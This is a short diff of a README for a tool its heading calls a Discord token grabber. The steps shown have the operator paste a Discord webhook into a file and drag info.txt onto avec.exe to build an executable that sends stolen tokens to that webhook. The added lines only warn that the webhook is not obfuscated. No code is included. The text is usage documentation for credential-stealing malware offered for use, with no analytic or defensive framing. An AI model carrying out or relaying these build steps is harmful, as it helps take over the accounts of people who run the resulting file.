@@ -10,6 +10,8 @@ A small self-patch Discord token grabber
 2. Paste your Discord webhook into the file
 3. Drag the file `info.txt` into `avec.exe`
 4. You should now have a `avec.exe` with your webhook
+   
+Keep in mind that your webhook is now not obfuscated in any way!
 
 https://github.com/user-attachments/assets/2beb34de-845b-40a1-8da5-a9f8970dbde4
 
